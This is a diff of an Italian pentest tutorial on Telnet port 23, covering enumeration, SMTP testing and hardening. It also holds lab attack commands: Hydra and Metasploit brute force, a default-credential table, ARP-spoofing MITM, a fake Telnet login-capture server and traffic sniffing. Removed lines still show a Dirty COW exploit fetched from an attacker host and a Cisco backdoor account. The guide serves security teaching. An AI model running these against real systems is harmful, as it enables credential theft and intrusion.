@@ -1,11 +1,8 @@
 ---
-title: 'Porta 23 Telnet: Credenziali in Chiaro, Sniffing e Brute Force'
+title: 'Telnet Porta 23: Guida Pentest, Comandi e Sicurezza'
 slug: porta-23-telnet
-description: >-
-  La porta 23 Telnet è una critical finding immediata: trasmette credenziali in
-  chiaro, facilita brute force, sniffing e accesso remoto insicuro. Scopri come
-  enumerarla, attaccarla e metterla in sicurezza.
-image: /porta-23-telnet.webp
+description: 'Cos''è Telnet e come attaccare la porta 23: enumerazione con Nmap, banner grabbing, credenziali di default, brute force, sniffing, Telnet vs SSH e hardening.'
+image: /telnet-port-23-pentesting.webp
 draft: false
 date: 2026-04-10T00:00:00.000Z
 categories:
@@ -13,61 +10,219 @@ categories:
 subcategories:
   - porte
 tags:
-  - telnet-sniffing
-  - default-credentials
+  - Telnet porta 23
+  - comandi Telnet
+  - 'Telnet vs SSH,'
+  - Telnet brute force
+  - Telnet default credentials
 ---
 
-La porta 23 è il gateway **completamente non cifrato** verso l'amministrazione remota — e rappresenta la vulnerabilità più critica che un sistema possa esporre a Internet. Telnet (Telecommunication Network) trasmette **username, password e ogni comando in chiaro assoluto**, rendendo ogni sessione intercettabile con un semplice packet sniffer. Sviluppato nel 1969 (RFC 854), Telnet predatende la crittografia di rete di oltre due decenni e non ha mai implementato alcuna forma di protezione dei dati. In ambiente lab e CTF, la porta 23 è il target più semplice e diretto: dalle credenziali di default all'intercettazione con Wireshark fino al brute force senza rate limiting, ogni tecnica di attacco funziona senza ostacoli crittografici.
+# Telnet Porta 23: Cos'è, Come Funziona e Come Attaccarlo (e Difenderlo)
 
-Telnet sopravvive nel 2026 solo in contesti legacy irrecuperabili: **router industriali** e switch gestiti prodotti pre-2010 che non supportano [SSH](/articoli/ssh/), **dispositivi embedded** (stampanti di rete, KVM-over-IP, PDU intelligenti, telecamere IP economiche), **PLC e SCADA** in impianti industriali dove l'aggiornamento firmware richiederebbe shutdown di produzione non sostenibili, e **laboratori CTF** come Metasploitable, DVWA e VulnHub dove Telnet viene deliberatamente esposto per scopi didattici. Ogni security audit professionale considera l'esposizione di Telnet su rete pubblica una **critical finding** con raccomandazione di remediation immediata.
+**Telnet** è un protocollo che permette di aprire un terminale su una macchina remota. Usa la **porta 23/TCP** e trasmette **username, password e ogni comando in chiaro**, senza nessuna cifratura. Chiunque sia sul percorso di rete può leggere tutto con un semplice sniffer. Telnet nasce alla fine degli anni '60 e viene formalizzato nella **RFC 854** (1983), molto prima della crittografia di rete: per questo non ha mai avuto alcuna protezione integrata.
+
+In un pentest o in un CTF la porta 23 è uno dei target più semplici: credenziali di default, brute force senza rate limiting, sniffing con Wireshark. Ma Telnet serve anche come **strumento di test**: connettersi a una porta TCP, controllare un server SMTP a mano, leggere un banner. Questo articolo copre entrambi i lati: enumerazione e attacco in laboratorio, e anche installazione, uso dei comandi, disabilitazione e hardening.
+
+Telnet sopravvive nel 2026 solo in contesti legacy: **router e switch** industriali che non supportano [SSH](https://hackita.it/articoli/ssh/), **dispositivi embedded** (stampanti, KVM-over-IP, PDU, telecamere IP economiche), **PLC e SCADA** dove aggiornare il firmware richiede fermi di produzione, e **laboratori CTF** come Metasploitable e VulnHub, dove viene lasciato aperto di proposito. Trovare Telnet esposto su Internet è un finding critico in qualsiasi audit.
+
+***
+
+## Cos'è Telnet: definizione e a cosa serve
+
+**Telnet** (Telecommunication Network) è un protocollo client-server che fornisce un terminale virtuale remoto. Il client si collega alla porta 23 del server, si autentica e ottiene una shell testuale.
+
+**A cosa serve Telnet oggi:**
+
+* Amministrare vecchi apparati di rete che non supportano SSH.
+* **Testare se una porta TCP è raggiungibile** (`telnet host porta`).
+* **Testare un server SMTP, HTTP o POP3 a mano**, perché sono protocolli testuali.
+* Leggere i banner dei servizi durante l'enumerazione.
+
+**A cosa non deve servire:** amministrazione remota su reti non fidate. Per quello si usa SSH (vedi la sezione Telnet vs SSH).
+
+***
+
+## Porta Telnet: numero di porta predefinito e altre porte
+
+La **porta telnet predefinita** è la **23/TCP**. Telnet però può essere configurato su qualsiasi porta, e in pratica ne vedi altre:
+
+| Porta | Uso                                                  |
+| ----- | ---------------------------------------------------- |
+| 23    | Telnet standard                                      |
+| 2323  | Alternativa molto comune su dispositivi IoT e router |
+| 992   | Telnet over TLS (raro)                               |
+| 22    | SSH, il sostituto sicuro                             |
+
+Per trovare un Telnet su porta non standard fai una scansione completa e guarda la colonna SERVICE:
+
+```bash
+nmap -p- --open -sV 10.10.10.20
+```
+
+Per le altre porte comuni vedi [porte TCP/UDP nel pentest](https://hackita.it/articoli/porte-tcp-udp-pentest/).
 
 ***
 
 ## Come funziona il protocollo Telnet
 
-Telnet è un protocollo client-server basato su **TCP porta 23** che fornisce accesso a terminale virtuale remoto. Opera attraverso negoziazione di opzioni (RFC 854, 855) ma senza alcuna cifratura o autenticazione sicura integrata.
+Telnet funziona sopra TCP e usa una **negoziazione di opzioni** (RFC 854 e 855) per accordare client e server su echo, tipo di terminale e dimensione finestra. Non c'è nessuna cifratura né autenticazione forte.
 
-**Flow completo di una sessione Telnet:**
+**Flusso di una sessione Telnet:**
 
-1. **TCP Handshake** — Client e server stabiliscono connessione TCP sulla porta 23
-2. **Option Negotiation** — Scambiano opzioni Telnet usando comandi IAC (Interpret As Command):
-   * `WILL/WON'T` — Il sender vuole/non vuole abilitare un'opzione
-   * `DO/DON'T` — Il sender vuole che il receiver abiliti/disabiliti un'opzione
-3. **Terminal Type Negotiation** — Negoziano tipo terminale (VT100, ANSI, xterm)
-4. **Authentication** — Il server richiede username e password **in chiaro**
-5. **Interactive Session** — Shell remota completamente in plaintext
-6. **Teardown** — Il client invia `exit` o `logout`, connessione TCP si chiude
+1. **Handshake TCP** sulla porta 23.
+2. **Negoziazione opzioni** con comandi IAC (`WILL`, `WON'T`, `DO`, `DON'T`).
+3. **Tipo di terminale** (VT100, ANSI, xterm).
+4. **Autenticazione:** il server chiede username e password, che viaggiano in chiaro.
+5. **Sessione interattiva** completamente in plaintext.
+6. **Chiusura** con `exit` o `logout`.
 
-**Comandi Telnet IAC (Interpret As Command):**
+**Comandi IAC (Interpret As Command):**
 
-| Byte       | Comando | Funzione                                            |
-| ---------- | ------- | --------------------------------------------------- |
-| 255 (0xFF) | IAC     | Interpret As Command — prefisso per tutti i comandi |
-| 251 (0xFB) | WILL    | Sender vuole abilitare opzione                      |
-| 252 (0xFC) | WON'T   | Sender rifiuta opzione                              |
-| 253 (0xFD) | DO      | Sender richiede al receiver di abilitare opzione    |
-| 254 (0xFE) | DON'T   | Sender richiede al receiver di disabilitare opzione |
-| 250 (0xFA) | SB      | Subnegotiation Begin                                |
-| 240 (0xF0) | SE      | Subnegotiation End                                  |
+| Byte       | Comando | Funzione                                          |
+| ---------- | ------- | ------------------------------------------------- |
+| 255 (0xFF) | IAC     | Prefisso per tutti i comandi                      |
+| 251 (0xFB) | WILL    | Chi invia vuole abilitare un'opzione              |
+| 252 (0xFC) | WON'T   | Chi invia rifiuta un'opzione                      |
+| 253 (0xFD) | DO      | Chi invia chiede all'altro di abilitare l'opzione |
+| 254 (0xFE) | DON'T   | Chi invia chiede all'altro di disabilitarla       |
+| 250 (0xFA) | SB      | Inizio subnegoziazione                            |
+| 240 (0xF0) | SE      | Fine subnegoziazione                              |
 
 **Opzioni Telnet comuni:**
 
-| Opzione               | Numero | Descrizione                                      |
-| --------------------- | ------ | ------------------------------------------------ |
-| Echo                  | 1      | Server fa echo dei caratteri digitati dal client |
-| Suppress Go Ahead     | 3      | Disabilita segnale "Go Ahead" dopo ogni comando  |
-| Status                | 5      | Richiede/fornisce status della connessione       |
-| Terminal Type         | 24     | Negozia tipo terminale (VT100, ANSI, ecc.)       |
-| Window Size           | 31     | Comunica dimensioni finestra terminale (NAWS)    |
-| Environment Variables | 36     | Passa variabili d'ambiente al server             |
+| Opzione               | Numero | Descrizione                                    |
+| --------------------- | ------ | ---------------------------------------------- |
+| Echo                  | 1      | Il server fa echo dei caratteri digitati       |
+| Suppress Go Ahead     | 3      | Disabilita il segnale "Go Ahead"               |
+| Status                | 5      | Richiede o fornisce lo stato della connessione |
+| Terminal Type         | 24     | Negozia il tipo di terminale                   |
+| Window Size           | 31     | Comunica la dimensione della finestra (NAWS)   |
+| Environment Variables | 36     | Passa variabili d'ambiente al server           |
 
-Le **misconfigurazioni comuni** sulla porta 23 includono: Telnet abilitato di default senza che l'admin se ne accorga, credenziali di fabbrica mai cambiate (`admin`/`admin`, `root`/`root`), Telnet esposto su Internet senza firewall, assenza completa di rate limiting o fail2ban, e logging insufficiente o disabilitato.
+Le **misconfigurazioni comuni** sulla porta 23: Telnet attivo di default senza che l'admin lo sappia, credenziali di fabbrica mai cambiate, Telnet esposto su Internet, nessun rate limiting o fail2ban e logging disabilitato.
 
 ***
 
-## Enumerazione base: nmap e banner grabbing
+## Comandi Telnet: Windows, Linux e prompt dei comandi
 
-Il primo passo è identificare la versione di Telnet e il sistema operativo target. Nmap offre script NSE specifici.
+I **comandi Telnet** sono quasi gli stessi su tutti i sistemi. La sintassi base è:
+
+```bash
+telnet <host> <porta>
+```
+
+Senza porta usa la 23. Con una porta diversa fai un **test di connessione a quella porta**:
+
+```bash
+telnet 10.10.10.20 2323
+```
+
+### Telnet su Windows (prompt dei comandi)
+
+Su Windows il **client Telnet** non è attivo di default. Si abilita da prompt dei comandi come amministratore:
+
+```cmd
+dism /online /Enable-Feature /FeatureName:TelnetClient
+```
+
+Oppure da PowerShell:
+
+```powershell
+Install-WindowsFeature -Name Telnet-Client
+```
+
+(`Install-WindowsFeature` vale per Windows Server; su Windows 10/11 usa il comando `dism` sopra.) Poi:
+
+```cmd
+telnet 10.10.10.20 23
+```
+
+Come alternativa nativa, senza installare nulla, per testare una porta:
+
+```powershell
+Test-NetConnection -ComputerName 10.10.10.20 -Port 23
+```
+
+Questo è anche un buon esempio di strumento nativo (LOLBin) per un test rapido: vedi [LOLBins](https://hackita.it/articoli/lolbins/).
+
+### Telnet su Linux
+
+```bash
+sudo apt install telnet -y
+telnet 10.10.10.20
+```
+
+### Come uscire da Telnet
+
+Se la sessione è bloccata o non risponde ai comandi normali:
+
+1. Premi `Ctrl + ]` (escape character).
+2. Dal prompt `telnet>` scrivi `quit` e premi invio.
+
+Se invece sei dentro la shell remota, basta `exit` o `logout`.
+
+### Comandi del prompt `telnet>`
+
+| Comando     | Cosa fa                             |
+| ----------- | ----------------------------------- |
+| `open host` | Apre una connessione                |
+| `close`     | Chiude la connessione corrente      |
+| `status`    | Mostra lo stato della connessione   |
+| `display`   | Mostra le impostazioni del client   |
+| `quit`      | Esce da Telnet                      |
+| `send ao`   | Invia un comando speciale al server |
+
+***
+
+## Telnet come strumento di test: porte e server SMTP
+
+### Test di una porta TCP
+
+```bash
+telnet 10.10.10.20 443
+```
+
+* `Connected to ...` significa che la porta è aperta.
+* `Connection refused` significa che è chiusa.
+* Nessuna risposta (timeout) significa che c'è un filtro o un firewall.
+
+### Test SMTP con Telnet
+
+Siccome SMTP è un protocollo testuale, puoi parlarci a mano. Esempio su un server di test:
+
+```bash
+telnet mail.example.com 25
+```
+
+```
+220 mail.example.com ESMTP Postfix
+EHLO test.local
+250-mail.example.com
+250-PIPELINING
+250-SIZE 10240000
+250-VRFY
+250 8BITMIME
+MAIL FROM:<test@test.local>
+250 2.1.0 Ok
+RCPT TO:<admin@example.com>
+250 2.1.5 Ok
+DATA
+354 End data with <CR><LF>.<CR><LF>
+Subject: test
+Messaggio di prova
+.
+250 2.0.0 Ok: queued
+QUIT
+221 2.0.0 Bye
+```
+
+In un pentest, la risposta ai comandi `VRFY` e `RCPT TO` permette di verificare se un utente esiste (user enumeration). Per la porta submission vedi [porta 587 SMTP](https://hackita.it/articoli/porta-587-smtp-submission/).
+
+***
+
+## Enumerazione Telnet con Nmap e banner grabbing
+
+Il primo passo è capire se la porta 23 è aperta e cosa c'è dietro (**telnet service detection**).
 
 ```bash
 nmap -sV -sC -p 23 10.10.10.20
@@ -81,9 +236,9 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-**Parametri:** `-sV` rileva versione del servizio, `-sC` esegue script NSE di default (`telnet-encryption`, `telnet-ntlm-info` se Windows).
+**Parametri:** `-sV` rileva la versione, `-sC` esegue gli script NSE di default (`telnet-encryption`, e `telnet-ntlm-info` se è un Windows). Per approfondire Nmap vedi la [guida a Nmap](https://hackita.it/articoli/nmap/).
 
-**Banner grabbing manuale con netcat:**
+### Banner grabbing con netcat
 
 ```bash
 nc -vn 10.10.10.20 23
@@ -91,13 +246,11 @@ nc -vn 10.10.10.20 23
 
 ```
 (UNKNOWN) [10.10.10.20] 23 (telnet) open
-Ubuntu 16.04.3 LTS
+Ubuntu 8.04
 metasploitable login:
 ```
 
-Il banner rivela: **Ubuntu 16.04.3 LTS** e hostname **metasploitable**. Telnet non nasconde queste informazioni — sono parte dell'handshake standard.
-
-**Connection test con telnet client:**
+Il banner rivela sistema operativo e hostname. Telnet non nasconde queste informazioni: fanno parte dell'handshake. Con il client classico:
 
 ```bash
 telnet 10.10.10.20
@@ -107,31 +260,25 @@ telnet 10.10.10.20
 Trying 10.10.10.20...
 Connected to 10.10.10.20.
 Escape character is '^]'.
-Ubuntu 16.04.3 LTS
+Ubuntu 8.04
 metasploitable login:
 ```
 
-Digitare username e password — tutto viaggia in chiaro.
+Con [netcat](https://hackita.it/articoli/netcat/) vedrai a volte dei byte strani prima del banner: sono i comandi IAC della negoziazione (`0xFF 0xFD ...`). È normale.
 
-***
-
-## Enumerazione avanzata: script NSE e sniffing credenziali
-
-Nmap include script NSE dedicati a Telnet. Il più utile è `telnet-ntlm-info` per sistemi Windows.
+### Script NSE per Telnet
 
 ```bash
 nmap --script="telnet-*" -p 23 10.10.10.20
 ```
 
-**Tabella script NSE per Telnet:**
+| Script              | Categoria     | Funzione                                      | Output chiave                 |
+| ------------------- | ------------- | --------------------------------------------- | ----------------------------- |
+| `telnet-encryption` | default, safe | Verifica se il server supporta cifratura      | `does not support encryption` |
+| `telnet-ntlm-info`  | safe          | Estrae informazioni NTLM da un Telnet Windows | NetBIOS name, DNS name, build |
+| `telnet-brute`      | intrusive     | Brute force credenziali                       | Username e password validi    |
 
-| Script              | Categoria     | Funzione                              | Output chiave                                |
-| ------------------- | ------------- | ------------------------------------- | -------------------------------------------- |
-| `telnet-encryption` | default, safe | Verifica se server supporta cifratura | `does not support encryption` se vulnerabile |
-| `telnet-ntlm-info`  | safe          | Enumera info NTLM da server Windows   | NetBIOS name, DNS name, OS build             |
-| `telnet-brute`      | intrusive     | Brute force credenziali               | Username/password validi                     |
-
-**telnet-ntlm-info su Windows Server:**
+**telnet-ntlm-info su un Windows con Telnet server (legacy):**
 
 ```bash
 nmap --script=telnet-ntlm-info -p 23 10.10.10.50
@@ -141,46 +288,70 @@ nmap --script=telnet-ntlm-info -p 23 10.10.10.50
 PORT   STATE SERVICE
 23/tcp open  telnet
 | telnet-ntlm-info:
-|   Target_Name: WINSERVER
-|   NetBIOS_Domain_Name: WINSERVER
-|   NetBIOS_Computer_Name: SRV2019
+|   Target_Name: CORP
+|   NetBIOS_Domain_Name: CORP
+|   NetBIOS_Computer_Name: SRV2008
 |   DNS_Domain_Name: corp.local
-|   DNS_Computer_Name: srv2019.corp.local
+|   DNS_Computer_Name: srv2008.corp.local
 |   DNS_Tree_Name: corp.local
-|_  Product_Version: 10.0.17763
+|_  Product_Version: 6.1.7601
 ```
 
-Informazioni critiche per Active Directory enumeration: domain name `corp.local`, computer name `SRV2019`, Windows build `10.0.17763` (Windows Server 2019).
-
-**Packet sniffing con Wireshark:**
-
-Se hai accesso alla rete (MITM, ARP spoofing, o sei sulla stessa subnet):
-
-```bash
-# Capture Telnet traffic
-tcpdump -i eth0 -A -n 'port 23'
-```
-
-```
-10:45:23.456789 IP 10.10.14.5.54321 > 10.10.10.20.23: Flags [P.], seq 1:6, ack 1, win 229, length 5
-E.....@.@...
-..........admin
-10:45:23.789012 IP 10.10.14.5.54321 > 10.10.10.20.23: Flags [P.], seq 6:16, ack 1, win 229, length 10
-E.....@.@...
-..........password123
-```
-
-Le credenziali `admin` / `password123` sono completamente visibili in chiaro.
-
-In Wireshark: filtrare con `tcp.port == 23`, clic destro su pacchetto → Follow → TCP Stream per vedere l'intera sessione come testo.
+Informazioni utili per l'enumerazione di Active Directory: dominio `corp.local`, nome host `SRV2008` e build `6.1.7601` (Windows Server 2008 R2). Vedi anche [enumeration](https://hackita.it/articoli/enumeration/).
 
 ***
 
-## Tecniche offensive: da brute force a credential sniffing
+## Telnet: vulnerabilità e misconfigurazioni
 
-### 1. Brute force con Hydra
+La vulnerabilità principale non è un bug di una versione specifica: è il **protocollo stesso**. Le problematiche da cercare in un test:
 
-Telnet è il target più facile per brute force: nessuna cifratura, rate limiting spesso assente.
+| Problema                        | Come lo verifichi                                                                 |
+| ------------------------------- | --------------------------------------------------------------------------------- |
+| Nessuna cifratura               | `nmap --script=telnet-encryption`                                                 |
+| Credenziali di default          | Test manuale e liste di default                                                   |
+| Autenticazione debole           | Brute force controllato                                                           |
+| Accesso senza autenticazione    | Connessione diretta: alcuni apparati danno subito una shell                       |
+| Telnet esposto su Internet      | Ricerca con [Shodan](https://hackita.it/articoli/shodan/) o scansione autorizzata |
+| Versione con CVE note           | `searchsploit telnet <versione>`                                                  |
+| Banner che rivela OS e versione | Banner grabbing                                                                   |
+
+Per le versioni vulnerabili del demone Telnet, parti sempre da:
+
+```bash
+searchsploit telnetd
+```
+
+***
+
+## Telnet default credentials: credenziali di default
+
+Su dispositivi embedded le credenziali di fabbrica spesso non vengono mai cambiate.
+
+| Dispositivo         | Username  | Password            |
+| ------------------- | --------- | ------------------- |
+| Cisco router/switch | `cisco`   | `cisco`             |
+| Cisco enable        | (nessuno) | `cisco`             |
+| 3Com switch         | `admin`   | `admin` o vuota     |
+| D-Link router       | `admin`   | vuota               |
+| Netgear router      | `admin`   | `password` o `1234` |
+| TP-Link router      | `admin`   | `admin`             |
+| Ubiquiti            | `ubnt`    | `ubnt`              |
+| APC UPS             | `apc`     | `apc`               |
+| IPMI/BMC            | `ADMIN`   | `ADMIN`             |
+
+**Test con una lista di default di SecLists:**
+
+```bash
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://10.10.10.20
+```
+
+***
+
+## Telnet brute force: Hydra, Nmap e Metasploit
+
+Telnet è un target semplice per il brute force: nessuna cifratura e spesso nessun rate limiting. Solo su sistemi autorizzati.
+
+**Hydra:**
 
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://10.10.10.20
@@ -193,9 +364,9 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://10.10.10.20
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-**Parametri:** `-l admin` utente singolo, `-P rockyou.txt` dizionario password, `telnet://` specifica protocollo.
+**Parametri:** `-l admin` utente singolo, `-P` dizionario password, `telnet://` indica il protocollo. Guida: [Hydra](https://hackita.it/articoli/hydra/).
 
-**Brute force con Nmap NSE:**
+**Nmap NSE:**
 
 ```bash
 nmap --script=telnet-brute --script-args userdb=users.txt,passdb=pass.txt -p 23 10.10.10.20
@@ -211,66 +382,7 @@ PORT   STATE SERVICE
 |_  Statistics: Performed 150 guesses in 45 seconds
 ```
 
-### 2. Credenziali di default
-
-Telnet su dispositivi embedded ha quasi sempre credenziali di fabbrica mai cambiate:
-
-| Device              | Username  | Password            |
-| ------------------- | --------- | ------------------- |
-| Cisco router/switch | `cisco`   | `cisco`             |
-| Cisco enable        | (nessuno) | `cisco`             |
-| 3Com switch         | `admin`   | `admin` o vuoto     |
-| D-Link router       | `admin`   | vuoto               |
-| Netgear router      | `admin`   | `password` o `1234` |
-| TP-Link router      | `admin`   | `admin`             |
-| Ubiquiti            | `ubnt`    | `ubnt`              |
-| APC UPS             | `apc`     | `apc`               |
-| Raritan KVM         | `admin`   | `raritan`           |
-| IPMI/BMC            | `ADMIN`   | `ADMIN`             |
-
-**SecLists — Telnet default credentials:**
-
-```bash
-hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://10.10.10.20
-```
-
-Il file contiene oltre 500 combinazioni username:password di default per dispositivi comuni.
-
-### 3. Man-in-the-Middle con Metasploit
-
-Creare un server Telnet fasullo per intercettare credenziali:
-
-```bash
-msfconsole -q
-use auxiliary/server/capture/telnet
-set SRVHOST 192.168.1.100
-set BANNER "Ubuntu 20.04 LTS\nlogin: "
-exploit
-```
-
-```
-[*] Auxiliary module running as background job 0.
-[*] Server started on 192.168.1.100:23
-[+] Telnet LOGIN 192.168.1.50:54321 admin / password123
-```
-
-Quando la vittima si connette al server fake, le credenziali vengono loggato in chiaro.
-
-### 4. Sniffing con Ettercap (ARP spoofing)
-
-Se sei sulla stessa LAN:
-
-```bash
-# ARP spoofing per MITM
-ettercap -T -M arp:remote /10.10.10.1// /10.10.10.20//
-
-# In altra finestra: capture Telnet
-tcpdump -i eth0 -A -n 'port 23' -w telnet.pcap
-```
-
-Aprire `telnet.pcap` in Wireshark, Follow TCP Stream — credenziali in chiaro.
-
-### 5. Metasploit brute force
+**Metasploit:**
 
 ```bash
 msfconsole -q
@@ -287,13 +399,85 @@ run
 [*] Command shell session 1 opened
 ```
 
+Guida: [Metasploit](https://hackita.it/articoli/metasploit/).
+
+***
+
+## Telnet cleartext credentials: sniffing e MITM
+
+Siccome Telnet è in chiaro, le credenziali si leggono direttamente dal traffico. Serve essere nel percorso di rete (stessa LAN, SPAN port, MITM).
+
+**Una particolarità importante:** Telnet invia **un carattere per pacchetto**. Con `tcpdump -A` vedrai le lettere separate, non la parola intera. Il modo corretto per leggere la sessione è ricostruire lo stream.
+
+**Cattura:**
+
+```bash
+tcpdump -i eth0 -n 'port 23' -w telnet.pcap
+```
+
+**Lettura dello stream completo con tshark:**
+
+```bash
+tshark -r telnet.pcap -q -z follow,tcp,ascii,0
+```
+
+```
+===================================================================
+Follow: tcp,ascii
+Node 0: 10.10.14.5:54321
+Node 1: 10.10.10.20:23
+===================================================================
+Ubuntu 8.04
+metasploitable login: msfadmin
+Password: msfadmin
+Last login: Sat Aug 14 12:34:56
+msfadmin@metasploitable:~$
+```
+
+Nota: in uno stream reale, dopo `login:` e `Password:` ogni carattere digitato torna come echo dal server. La password stessa non viene mostrata a video dal server, ma è presente nei pacchetti inviati dal client: nello stream "follow" la vedi nella parte del client.
+
+In Wireshark: filtro `tcp.port == 23`, clic destro su un pacchetto, **Follow → TCP Stream**. Guide: [Wireshark](https://hackita.it/articoli/wireshark/), [tcpdump](https://hackita.it/articoli/tcpdump/) e [sniffing](https://hackita.it/articoli/sniffing/).
+
+### Man-in-the-middle con ARP spoofing
+
+Se sei sulla stessa LAN in un laboratorio, puoi mettere la tua macchina nel mezzo con ARP spoofing e poi catturare il traffico. Vedi [man-in-the-middle](https://hackita.it/articoli/man-in-the-middle/).
+
+```bash
+# Enable IP forwarding so the victim keeps working
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# Poison the victim and the gateway (two terminals)
+sudo arpspoof -i eth0 -t 10.10.10.20 10.10.10.1
+sudo arpspoof -i eth0 -t 10.10.10.1 10.10.10.20
+
+# Capture Telnet traffic
+sudo tcpdump -i eth0 -n 'port 23' -w telnet_mitm.pcap
+```
+
+### Server Telnet falso con Metasploit
+
+```bash
+msfconsole -q
+use auxiliary/server/capture/telnet
+set SRVHOST 192.168.1.100
+exploit
+```
+
+```
+[*] Auxiliary module running as background job 0.
+[*] Server started on 192.168.1.100:23
+[+] Telnet LOGIN 192.168.1.50:54321 admin / password123
+```
+
+Quando un utente si connette al server falso (per esempio dopo un DNS spoofing in laboratorio), le credenziali vengono registrate.
+
 ***
 
 ## Tre scenari pratici da lab e CTF
 
-### Scenario 1 — Metasploitable 2: msfadmin:msfadmin
+### Scenario 1: Metasploitable 2 con msfadmin:msfadmin
 
-**Contesto:** macchina Metasploitable 2 con Telnet abilitato e credenziali di default.
+**Contesto:** Metasploitable 2 con Telnet abilitato e credenziali di default.
 
 ```bash
 nmap -sV -p 23 192.168.1.100
@@ -304,42 +488,32 @@ nmap -sV -p 23 192.168.1.100
 ```
 
 ```bash
-# Tentativo con credenziali di default comuni
 telnet 192.168.1.100
 # login: msfadmin
 # Password: msfadmin
 ```
 
 ```
-Welcome to Ubuntu 8.04.1 LTS (GNU/Linux 2.6.24-16-server i686)
-Last login: Sat Aug 14 12:34:56 2024
+Welcome to Ubuntu 8.04 (GNU/Linux 2.6.24-16-server i686)
 msfadmin@metasploitable:~$
 ```
 
-**Privilege escalation:**
+**Privilege escalation:** l'utente `msfadmin` ha permessi sudo completi.
 
 ```bash
-msfadmin@metasploitable:~$ uname -a
-# Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux
+msfadmin@metasploitable:~$ sudo -l
+# User msfadmin may run the following commands: (ALL) ALL
 
-# Kernel vulnerabile a Dirty COW (CVE-2016-5195)
-msfadmin@metasploitable:~$ wget http://10.10.14.5/dirtycow.c
-msfadmin@metasploitable:~$ gcc -pthread dirtycow.c -o dirtycow -lcrypt
-msfadmin@metasploitable:~$ ./dirtycow
-# [+] mmap: 0xb7fd5000
-# [+] exploiting...
-# [+] /etc/passwd backed up to /tmp/passwd.bak
-# [+] Root password changed to: dirtyCowFun
-
-msfadmin@metasploitable:~$ su root
-# Password: dirtyCowFun
+msfadmin@metasploitable:~$ sudo su
 root@metasploitable:~# id
-# uid=0(root) gid=0(root)
+# uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### Scenario 2 — Router Cisco con credenziali default
+Su sistemi con sudo più restrittivo, il kernel 2.6.24 è comunque vulnerabile a diversi exploit locali: vedi [Linux privilege escalation](https://hackita.it/articoli/linux-privesc/).
 
-**Contesto:** router Cisco IOS con Telnet abilitato, credenziali mai cambiate.
+### Scenario 2: router Cisco con credenziali di default
+
+**Contesto:** router Cisco IOS con Telnet abilitato e credenziali mai cambiate.
 
 ```bash
 telnet 192.168.1.1
@@ -353,7 +527,7 @@ Password: cisco
 Router>
 ```
 
-**Escalation a privileged mode:**
+**Passaggio a privileged mode:**
 
 ```
 Router> enable
@@ -366,118 +540,96 @@ Router#
 
 ```
 Router# show running-config
-# <entire config in plaintext, includes passwords, SNMP community strings, VPN PSK>
+! The full config is shown in plaintext: it can include password hashes,
+! SNMP community strings and VPN pre-shared keys
 
 Router# show version
-# Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE4
-
-Router# write memory
-# Salva config modificata
-
-Router# configure terminal
-Router(config)# username backdoor privilege 15 password 0 Password123!
-Router(config)# end
-Router# write memory
-# Backdoor user creato con privilegi massimi
+! Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 15.0(2)SE4
 ```
 
-### Scenario 3 — Credential capture via packet sniffing
+Nella configurazione ci sono spesso password con cifratura debole (tipo 7), facilmente reversibili. In un pentest reale si documenta la finding e non si modifica la configurazione del cliente.
 
-**Contesto:** penetration test interno, accesso alla LAN, sniffing traffic Telnet.
+### Scenario 3: credenziali catturate con sniffing e riuso su SSH
 
-Attacker box su 192.168.1.50, target Telnet server su 192.168.1.20, admin si connette da 192.168.1.100.
+**Contesto:** pentest interno, accesso alla LAN, traffico Telnet verso un file server.
 
 ```bash
-# Setup packet capture
-tcpdump -i eth0 -A -n 'host 192.168.1.20 and port 23' -w telnet_capture.pcap &
+# Capture traffic to and from the Telnet server
+tcpdump -i eth0 -n 'host 192.168.1.20 and port 23' -w telnet_capture.pcap
 ```
 
-Admin si connette:
+Un amministratore si collega da `192.168.1.100`. Poi ricostruisci lo stream:
+
+```bash
+tshark -r telnet_capture.pcap -q -z follow,tcp,ascii,0
+```
 
 ```
-[admin@workstation ~]$ telnet 192.168.1.20
-# Username: sysadmin
+Ubuntu 18.04 LTS
+fileserver login: sysadmin
+Password: Sup3rS3cur3!
+```
+
+Credenziali catturate: `sysadmin` / `Sup3rS3cur3!`. Il riuso su SSH è il passo successivo più comune:
+
+```bash
+ssh sysadmin@192.168.1.20
 # Password: Sup3rS3cur3!
+sysadmin@fileserver:~$
 ```
 
-Attacker analizza capture:
-
-```bash
-tcpdump -A -r telnet_capture.pcap | grep -A 5 -B 5 "login:"
-```
-
-```
-192.168.1.100.54321 > 192.168.1.20.23: Flags [P.], seq 1:9, ack 1, win 229, length 8
-sysadmin
-
-192.168.1.100.54321 > 192.168.1.20.23: Flags [P.], seq 9:22, ack 1, win 229, length 13
-Sup3rS3cur3!
-```
-
-Credenziali catturate: `sysadmin` / `Sup3rS3cur3!`
-
-**Riuso credenziali su SSH:**
-
-```bash
-ssh [email protected]
-# Password: Sup3rS3cur3!
-sysadmin@server:~$
-```
-
-Password reuse — accesso SSH ottenuto con credenziali sniffate da Telnet.
+Il **password reuse** è la ragione per cui un Telnet "isolato" è un rischio anche per i servizi cifrati. Vedi [pentest SSH](https://hackita.it/articoli/ssh-pentesting-guide/) e [password spraying](https://hackita.it/articoli/password-spraying/).
 
 ***
 
-## Toolchain integration: dalla recon alla post-exploitation
-
-**Pipeline completa:**
+## Toolchain: dalla recon alla post-exploitation
 
 ```
 RECONNAISSANCE
 │
-├─ nmap -sV -sC -p 23 <target>             → Versione + OS detection
-├─ nc -vn <target> 23                      → Banner grab manuale
-└─ searchsploit telnet <version>           → CVE pubblici
+├─ nmap -sV -sC -p 23 <target>             → Version + OS detection
+├─ nc -vn <target> 23                      → Manual banner grab
+└─ searchsploit telnetd <version>          → Public CVEs
 
 ENUMERATION
 │
 ├─ nmap --script=telnet-ntlm-info          → Windows info (NTLM)
